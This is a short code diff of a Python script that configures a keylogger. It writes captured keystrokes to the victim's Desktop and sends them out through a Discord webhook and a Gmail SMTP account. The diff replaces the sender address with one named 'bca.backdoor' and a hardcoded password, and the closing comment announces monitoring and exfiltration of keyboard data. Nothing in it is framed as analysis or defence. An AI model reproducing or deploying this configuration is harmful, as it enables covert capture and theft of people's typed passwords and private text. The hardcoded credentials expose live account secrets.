@@ -22,7 +22,7 @@ Screen(module=keylogger)
 
 # A file will be written to the current user's Desktop
 File(module=keylogger,
-     file_path=pathlib.Path.home().joinpath("Desktop/sample_log.txt"))
+     file_path=pathlib.Path.home().joinpath("Desktop/sample_keylogger_log.txt"))
 
 # Captured data will be sent to a Discord server through a Webhook URL
 Discord(module=keylogger,
@@ -34,8 +34,8 @@ Discord(module=keylogger,
 Email(module=keylogger,
       smtp_host="smtp.gmail.com",
       smtp_port=465,
-      email="eonraider.keylogger@gmail.com",
-      password="yMQsKYDFhod!E84fSSaE74bLoKSgAkapz$Ro8J9C")
+      email="bca.backdoor@gmail.com",
+      password="Ng!a94fGBtfij4$btbmf@q9&p6gk9@&qY63qPdh!")
 
 # Done. Begin monitoring of keyboard events and exfiltration of data.
 keylogger.execute()
